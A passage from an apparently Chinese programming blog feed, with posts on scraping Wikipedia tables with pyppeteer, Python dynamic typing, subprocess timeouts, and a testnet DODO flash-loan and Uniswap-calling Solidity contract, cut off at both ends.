class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    languages = &#123;</span><br><span class="line">        <span class="string">&quot;python&quot;</span>: <span class="string">&quot;https://en.wikipedia.org/wiki/Python_(programming_language)&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;Rust&quot;: &quot;https://es.wikipedia.org/wiki/Rust_(lenguaje_de_programaci%C3%B3n)&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;Java&quot;: &quot;https://es.wikipedia.org/wiki/Java_(lenguaje_de_programaci%C3%B3n)&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;Javascript&quot;: &quot;https://es.wikipedia.org/wiki/JavaScript&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> name, url <span class="keyword">in</span> languages.items():</span><br><span class="line">        response = get_page(url)</span><br><span class="line">        document = read_document(response)</span><br><span class="line">        result.update(&#123;name: extract_data(document)&#125;)</span><br><span class="line"></span><br><span class="line">    pprint.pprint(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>预期结果:</p>
<p><img src="https://i.loli.net/2019/05/19/5ce1767fb20d290774.png" alt="" /></p>
<hr />
<h2 id="puppeteer">puppeteer:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/5/18 11:32 PM</span></span><br><span class="line"><span class="comment"># @Author  : Jerry</span></span><br><span class="line"><span class="comment"># @Desc    : </span></span><br><span class="line"><span class="comment"># @File    : pyppeteer1.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_browser</span>():  <span class="comment"># 启动浏览器</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> launch(&#123;<span class="string">&quot;headless&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">browser, url</span>):</span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> page.goto(url)</span><br><span class="line">    <span class="keyword">return</span> page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">browser, name, url</span>):</span><br><span class="line">    page = <span class="keyword">await</span> get_page(browser, url)</span><br><span class="line">    <span class="keyword">return</span> &#123;name: <span class="keyword">await</span> extract_data(page)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">extract_data</span>(<span class="params">page</span>):  <span class="comment"># 数据提取</span></span><br><span class="line">    <span class="comment"># Select tr with a th and td descendant from table</span></span><br><span class="line">    elements = <span class="keyword">await</span> page.xpath(</span><br><span class="line">        <span class="string">&#x27;//*[@id=&quot;mw-content-text&quot;]/div/table[1]/tbody/tr[th and td]&#x27;</span>)</span><br><span class="line">    <span class="comment"># Extract data</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">        title, content = <span class="keyword">await</span> page.evaluate(</span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;(element) =&gt;</span></span><br><span class="line"><span class="string">                [...element.children].map(child =&gt; child.textContent)&#x27;&#x27;&#x27;</span>,</span><br><span class="line">            element)</span><br><span class="line">        result.update(&#123;title: content&#125;)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">extract_all</span>(<span class="params">languages</span>):  <span class="comment"># 程序入口</span></span><br><span class="line">    browser = <span class="keyword">await</span> get_browser()  <span class="comment"># 启动浏览器</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> name, url <span class="keyword">in</span> languages.items():</span><br><span class="line">        result.update(<span class="keyword">await</span> extract(browser, name, url))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    languages = &#123;</span><br><span class="line">        <span class="string">&quot;python&quot;</span>: <span class="string">&quot;https://en.wikipedia.org/wiki/Python_(programming_language)&quot;</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    result = loop.run_until_complete(extract_all(languages))</span><br><span class="line"></span><br><span class="line">    pprint.pprint(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同样能够获取到和预期一样的结果</p>
<hr />
<h1>总结:</h1>
<p>从Demo出发,再不断改进优化功能.<br />
便能慢慢有些雏形出来了.<br />
Keeo Moving.</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.anquanke.com/post/id/178339">漏扫动态爬虫实践</a></p>
</li>
<li class="lvl-2">
<p><a href="https://antoinevastel.com/crawler/2018/09/17/simple-crawler-puppeteer.html">A simple crawler using Chrome headless with Puppeteer</a></p>
</li>
<li class="lvl-2">
<p><a href="https://medium.com/z1digitalstudio/pyppeteer-the-snake-charmer-f3d1843ddb19">Pyppeteer, the snake charmer</a></p>
</li>
<li class="lvl-2">
<p><a href="https://miyakogi.github.io/pyppeteer/">Pyppeteer文档</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-dynamic typing</title>
    <url>/2019/64499.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<h2 id="Question1">Question1:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">type</span>(a)</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>我们并没有显示声明<code>a</code>是个变量而且它的类型为<code>int</code></p>
<p>那么python是怎么知道<code>a</code>是个变量而且知道它的类型的呢?</p>
<hr />
<h2 id="Question2">Question2:</h2>
<p>执行以下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;string&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">&#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>
<p>a 的类型怎么发生了变化?</p>
<hr />
<p>以上2个问题涉及到python的一个重要的概念:<strong>动态类型(dynamic typing)</strong></p>
<p>要搞清楚动态类型之前要先搞清楚3个重要的概念及其关系:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Object 对象</p>
</li>
<li class="lvl-2">
<p>Reference 引用</p>
</li>
<li class="lvl-2">
<p>Variable 变量</p>
</li>
</ul>
<hr />
<h1>三个重要的概念:</h1>
<h2 id="Object">Object:</h2>
<p>对象是我们分配的内存块,有足够的空间去存储数据.</p>
<p>所以<code>dict</code>、<code>list</code>、<code>string</code>这些对象在内存中都是一段01序列</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7188bb7d.jpg" alt="" /></p>
<p>除了告诉解释器它是多少位后,它还要声明类型.</p>
<p>所以每个对象都有一个标准头部信息:类型标识符<code>type designator</code>来表示对象的类型.</p>
<hr />
<h2 id="Reference">Reference:</h2>
<p>由于我们不能直接接触到存在内存中的对象,能操作的是变量名,所以我们要将变量和对象建立一个关系:引用<code>reference</code></p>
<p>python的引用跟C语言的指针很像,因为引用就是用指针实现的.</p>
<hr />
<h2 id="Variable">Variable:</h2>
<p>建立引用关系之后,我们就可以用变量名来操控对象了.</p>
<p>所以,变量是对对象的引用的一个符号名。</p>
<hr />
<h2 id="三者的关系">三者的关系:</h2>
<p>变量和对象存储在内存的不同部分中,并链接了起来(由指针).</p>
<p>实际就是,执行一个赋值语句的时候,python会做三件事:</p>
<ol>
<li class="lvl-3">
<p>创建一个<code>对象</code>代表数值3</p>
</li>
<li class="lvl-3">
<p>创建一个<code>变量名a</code></p>
</li>
<li class="lvl-3">
<p>将<code>对象3</code>和<code>变量a</code>关联起来</p>
</li>
</ol>
<p><img src="https://i.loli.net/2019/04/25/5cc1d71989d84.jpg" alt="" /></p>
<hr />
<h1>共享引用</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/04/25/5cc1d71a328d9.jpg" alt="" /></p>
<p>多个变量名同时指向同一个对象,称为共享引用<code>Shared References</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;spam&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/04/25/5cc1d71adac08.jpg" alt="" /></p>
<p><code>变量a</code> 改变了指向，指向到了<code>'spam'对象</code></p>
<p>而<code>变量b</code>还是指向原来的<code>3对象</code>,所以值没有改变</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>《Studing Learning Python》</p>
</li>
<li class="lvl-2">
<p><a href="https://realpython.com/python-variables/">Variables in Python</a></p>
</li>
<li class="lvl-2">
<p><a href="http://www.cnblogs.com/vamei/archive/2012/07/10/2582795.html">Python进阶09 动态类型</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.youtube.com/watch?v=OE2j6hlU88o&amp;t=2s">Dynamic Typing in Python</a></p>
</li>
<li class="lvl-2">
<p><a href="https://eli.thegreenplace.net/2012/03/30/python-objects-types-classes-and-instances-a-glossary">Python objects, types, classes, and instances - a glossary</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-杀死subprocess进程</title>
    <url>/2019/7012.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>在整合第三方工具的时候,我们常常会用<code>subprocess</code>库来调用可执行文件.</p>
<p>一般情况下,我们会等待这个命令的结束.</p>
<p>但有时候第三方工具会因为特殊情况而卡死,从而导致整个程序卡死.</p>
<p>此时,我们可以设置一个最大的超时时间.</p>
<p>当这个命令超过这个最大时间的时候,我们主动kill掉,以保证程序接下来可以正常运行.</p>
<hr />
<h1>py3:</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = subprocess.Popen([cmd],stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    (stdoutput, erroutput) = p.communicate(timeout=TIMEOUT)  <span class="comment"># 超时时间</span></span><br><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    p.kill()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] TIMEOUT: %s&quot;</span> % cmd)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>py3的<code>subprocess</code>库原生支持了超时时间的参数.</p>
<p>过了超时时间的时候,会抛出<code>TimeoutExpired</code>异常.我们只需要<code>catch</code>到再做处理就行了.</p>
<hr />
<h1>py2:</h1>
<p>没想到py2的<code>subprocess</code>库还并没有支持<code>timeout</code>参数.只能自己手动计时.到时间kill掉.</p>
<p>搜索到的实现比较好的示例代码,只需要简单改改就可以用了.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Timer</span><br><span class="line"> </span><br><span class="line">kill = <span class="keyword">lambda</span> process: process.kill()</span><br><span class="line">cmd = [<span class="string">&#x27;ping&#x27;</span>, <span class="string">&#x27;www.google.com&#x27;</span>]</span><br><span class="line">ping = subprocess.Popen(</span><br><span class="line">    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"> </span><br><span class="line">my_timer = Timer(<span class="number">5</span>, kill, [ping])</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    my_timer.start()</span><br><span class="line">    stdout, stderr = ping.communicate()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    my_timer.cancel()</span><br></pre></td></tr></table></figure>
<hr />
<h1>另一种卡死的情况:</h1>
<blockquote>
<p>原因是使用<code>Popen.wait()</code>后直接读<code>PIPE.stdout.read()</code>之前，可能缓存已经满了，此时导致了卡死。</p>
<p>解决办法：使用<code>communicate()</code>,这个方法会把输出放在内存，而不是管道里，所以这时候上限就和内存大小有关了，一般不会有问题。</p>
</blockquote>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.blog.pythonlibrary.org/2016/05/17/python-101-how-to-timeout-a-subprocess/">Python 101: How to timeout a subprocess</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/chybot/p/5176118.html">python Popen卡死问题</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/sueris/p/6235861.html">Python subprocess.Popen communicate() 和wait()使用上的区别</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Programming</tag>
      </tags>
  </entry>
  <entry>
    <title>SmartContract-DoDoFlashLoan测试网例子</title>
    <url>/2022/33960.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>DoDo支持flash loan,并且手续费上比较友好</p>
<blockquote>
<p>注：DODO V2 闪电贷仅当返还的base quote 数量比例产生变化时，合约会预览一笔将base quote 磨平的交易，该磨平交易手续费作为闪电贷手续费。其他情况不收取手续费用</p>
</blockquote>
<p>试试在<code>rinkby</code>测试网上能否执行借款还款操作</p>
<h1>DoDo闪电交换机制:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226162909.png" alt="20220226162909" /></p>
<h1>Code:</h1>
<h2 id="solidity代码">solidity代码:</h2>
<p>参考文档里<a href="https://dodoex.github.io/docs/zh/docs/flashSwap">闪电交换</a>，有代码例子该代码则是只实现了借款和还款的操作，具体的借款后的操作逻辑还要自己实现</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./interface/IDODO.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./interface/Withdraw.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Flashloan</span> is <span class="title class_">Withdraw</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">dodoFlashLoan</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address flashLoanPool, <span class="comment">//You will make a flashloan from this DODOV2 pool</span></span></span><br><span class="line"><span class="params">        uint256 loanAmount, </span></span><br><span class="line"><span class="params">        address loanToken</span></span><br><span class="line"><span class="params">    </span>) external  &#123;</span><br><span class="line">        <span class="comment">//Note: The data can be structured with any variables required by your logic. The following code is just an example</span></span><br><span class="line">        bytes memory data = abi.<span class="title function_">encode</span>(flashLoanPool, loanToken, loanAmount);</span><br><span class="line">        address flashLoanBase = <span class="title function_">IDODO</span>(flashLoanPool).<span class="title function_">_BASE_TOKEN_</span>();</span><br><span class="line">        <span class="keyword">if</span>(flashLoanBase == loanToken) &#123;</span><br><span class="line">            <span class="title function_">IDODO</span>(flashLoanPool).<span class="title function_">flashLoan</span>(loanAmount, <span class="number">0</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">IDODO</span>(flashLoanPool).<span class="title function_">flashLoan</span>(<span class="number">0</span>, loanAmount, <span class="title function_">address</span>(<span class="variable language_">this</span>), data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Note: CallBack function executed by DODOV2(DVM) flashLoan pool</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DVMFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount,bytes calldata data</span>) external &#123;</span><br><span class="line">        <span class="title function_">_flashLoanCallBack</span>(sender,baseAmount,quoteAmount,data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Note: CallBack function executed by DODOV2(DPP) flashLoan pool</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DPPFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data</span>) external &#123;</span><br><span class="line">        <span class="title function_">_flashLoanCallBack</span>(sender,baseAmount,quoteAmount,data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Note: CallBack function executed by DODOV2(DSP) flashLoan pool</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DSPFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data</span>) external &#123;</span><br><span class="line">        <span class="title function_">_flashLoanCallBack</span>(sender,baseAmount,quoteAmount,data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_flashLoanCallBack</span>(<span class="params">address sender, uint256, uint256, bytes calldata data</span>) internal &#123;</span><br><span class="line">        (address flashLoanPool, address loanToken, uint256 loanAmount) = abi.<span class="title function_">decode</span>(data, (address, address, uint256));</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(sender == <span class="title function_">address</span>(<span class="variable language_">this</span>) &amp;&amp; msg.<span class="property">sender</span> == flashLoanPool, <span class="string">&quot;HANDLE_FLASH_NENIED&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Note: Realize your own logic using the token from flashLoan pool.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Return funds</span></span><br><span class="line">        <span class="title class_">IERC20</span>(loanToken).<span class="title function_">transfer</span>(flashLoanPool, loanAmount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="brownie">brownie</h2>
<p>部署脚本:</p>
<p><code>brownie run scripts/deployment.py --network rinkeby</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> Flashloan, accounts, config, network</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Deploy a `Flashloan` contract from `accounts[0]`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    acct = accounts.add(</span><br><span class="line">        config[<span class="string">&quot;wallets&quot;</span>][<span class="string">&quot;from_key&quot;</span>]</span><br><span class="line">    )  <span class="comment"># add your keystore ID as an argument to this call</span></span><br><span class="line"></span><br><span class="line">    flashloan = Flashloan.deploy(&#123;<span class="string">&quot;from&quot;</span>: acct&#125;)</span><br><span class="line">    <span class="keyword">return</span> flashloan</span><br></pre></td></tr></table></figure>
<p>执行脚本</p>
<p><code>brownie run scripts/run_flash_loan.py --network rinkeby</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> Flashloan, accounts, config, network, interface</span><br><span class="line"></span><br><span class="line">ETHERSCAN_TX_URL = <span class="string">&quot;https://rinkeby.etherscan.io/tx/&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Executes the funcitonality of the flash loan.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    acct = accounts.add(config[<span class="string">&quot;wallets&quot;</span>][<span class="string">&quot;from_key&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Getting Flashloan contract...&quot;</span>)</span><br><span class="line">    flashloan = Flashloan[<span class="built_in">len</span>(Flashloan) - <span class="number">1</span>]</span><br><span class="line">    usdc = interface.IERC20(config[<span class="string">&quot;networks&quot;</span>][network.show_active()][<span class="string">&quot;usdc&quot;</span>])</span><br><span class="line"></span><br><span class="line">    balance = usdc.balanceOf(acct) </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Executing Flashloan...&quot;</span>)</span><br><span class="line">    tx = flashloan.dodoFlashLoan(<span class="string">&quot;0x446Bb563EEC2E5C439f5b94C6DaAebcCF5d2F99C&quot;</span>,<span class="number">10000000</span>,<span class="string">&quot;0xab0733588776B8881F7712f6AbCa98F510e6B63D&quot;</span>,  &#123;<span class="string">&quot;from&quot;</span>: acct, <span class="string">&quot;gas_limit&quot;</span>:<span class="string">&quot;5074044&quot;</span>, <span class="string">&quot;allow_revert&quot;</span>:<span class="literal">True</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You did it! View your tx here: &quot;</span> + ETHERSCAN_TX_URL.<span class="built_in">format</span>(tx.txid))</span><br><span class="line">    <span class="keyword">return</span> flashloan</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="执行效果">执行效果:</h2>
<p><a href="https://rinkeby.etherscan.io/tx/0xbc67ada4c2d570f8aba40cae4bd47794d9f25f4969b72792b30d2e23f0c8481b">tx</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226164550.png" alt="20220226164550" /></p>
<p>能成功借款还款</p>
<h1>遇到的问题:</h1>
<p>dodoFlashLoan函数有3个参数:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>flashLoanPool 池子地址</p>
</li>
<li class="lvl-2">
<p>loanAmount 数量</p>
</li>
<li class="lvl-2">
<p>loanToken 要借的token地址</p>
</li>
</ul>
<h2 id="选择池子地址">选择池子地址:</h2>
<p>在<code>https://app.dodoex.io/pool/list?network=rinkeby</code>可以看到有哪些池子信息</p>
<p>比如此处我要借usdc，就可以搜索一下</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226161537.png" alt="20220226161537" /></p>
<p>然后该池子还要支持flashloan，比如上图第一个池子就不支持，第二个池子才支持</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226161948.png" alt="20220226161948" /></p>
<h2 id="借款数量">借款数量</h2>
<p>一开始我填的<code>loanAmount</code>为10 ether,想借10个，转换成wei则为<code>10000000000000000000</code>执行后报错，无法正常借款还款</p>
<p>查一下报错<br />
<code>https://dashboard.tenderly.co/tx/rinkeby/0xee7f3a6e0ef5906f8f95cbc789151e1d62da424dc80c6d93c80307ba060be646</code></p>
<p><code>Error Message:ERC20: transfer amount exceeds balance</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226162947.png" alt="20220226162947" /></p>
<p>对比一下Dodo流程，此时池子在借款的时候，要发送token给我合约时报错了，报错信息为转账数量超过余额了。</p>
<p>减少<code>loanAmount</code>为<code>10000000</code>后，发现能成功，原来该usdc的精度为6位</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226163700.png" alt="20220226163700" /></p>
<p>以后要注意一下，大多数代币的精度为18位，但有些代币不是。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://dodoex.github.io/docs/zh/docs/flashSwap">闪电交换</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/yuichiroaoki/poly-flash/blob/main/test/dodoflash.test.ts">https://github.com/yuichiroaoki/poly-flash/blob/main/test/dodoflash.test.ts</a></p>
</li>
<li class="lvl-2">
<p><a href="https://medium.com/coinmonks/no-flashloan-fee-with-dodo-cc78215d7f93">No Flashloan Fee with DODO</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>SmartContract-合约里调用Uniswap</title>
    <url>/2022/50077.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>在学习闪电贷的过程中，先熟悉一下合约里调用其他swap合约的用法先试一下如何在自己的合约里调用uniswap</p>
<h1>完整代码:</h1>
<p>kovan测试网里</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>uniswapV2: <code>0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</code></p>
</li>
<li class="lvl-2">
<p>dai: <code>0x4F96Fe3b7A6Cf9725f59d353F723c1bDb64CA6Aa</code></p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity  <span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router02.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">UseSwap</span> &#123;</span><br><span class="line">    <span class="title class_">IUniswapV</span>2Router02 private constant <span class="variable constant_">ROUTER</span> = <span class="title class_">IUniswapV</span>2Router02(<span class="number">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span>); <span class="comment">//</span></span><br><span class="line">    address internal owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">isOwner</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Caller is not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapTokenToEth</span>(<span class="params">address token, uint amountOut, uint amountInMax </span>) public&#123;</span><br><span class="line">        <span class="title class_">IERC20</span>(token).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amountInMax); <span class="comment">// 往合约里转账</span></span><br><span class="line">        <span class="title function_">_approveTokenIfNeeded</span>(token); <span class="comment">// 合约地址授权给router地址</span></span><br><span class="line">        uint deadline = block.<span class="property">timestamp</span> + <span class="number">100</span>;</span><br><span class="line">        <span class="variable constant_">ROUTER</span>.<span class="title function_">swapTokensForExactETH</span>(amountOut, amountInMax, <span class="title function_">getPathForTokenToEth</span>(token), <span class="title function_">address</span>(<span class="variable language_">this</span>), deadline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapEthToToken</span>(<span class="params">address token, uint TokenOutAmountMin</span>) public payable&#123;</span><br><span class="line">        uint deadline = block.<span class="property">timestamp</span> + <span class="number">100</span>;</span><br><span class="line">        <span class="variable constant_">ROUTER</span>.<span class="property">swapExactETHForTokens</span>&#123; <span class="attr">value</span>: msg.<span class="property">value</span> &#125;(<span class="title class_">TokenOutAmountMin</span>, <span class="title function_">getPathForEthToToken</span>(token), <span class="title function_">address</span>(<span class="variable language_">this</span>), deadline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 授权 </span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_approveTokenIfNeeded</span>(<span class="params">address token</span>) private &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">IERC20</span>(token).<span class="title function_">allowance</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="title function_">address</span>(<span class="variable constant_">ROUTER</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title class_">IERC20</span>(token).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable constant_">ROUTER</span>), <span class="number">1000000</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approveToken</span>(<span class="params">address token</span>) public &#123;</span><br><span class="line">        <span class="title class_">IERC20</span>(token).<span class="title 